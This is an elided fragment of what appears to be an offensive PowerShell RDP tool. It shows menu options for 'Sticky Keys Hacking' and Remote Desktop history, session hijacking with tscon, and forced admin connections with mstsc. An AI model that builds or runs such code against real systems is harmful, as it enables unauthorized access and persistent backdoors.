...
if($Language -in 'Spanish') {
  ...
  $Pwn6  = "Agente de sesión de RDP" }
	...
	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        ...
        Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Remote Desktop History" ; Write-Host "[M] - $txt11" ; Write-Host "" ; $module = Read-Host -Prompt "$txt6" ; Write-Host ""
	...
	if($module -like '6') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host ""
   ...
   $session = get-pssession ; if ($session){ 
	...
	if($stickykeys){ $control = $null ; mstsc /v $computer /admin /f }
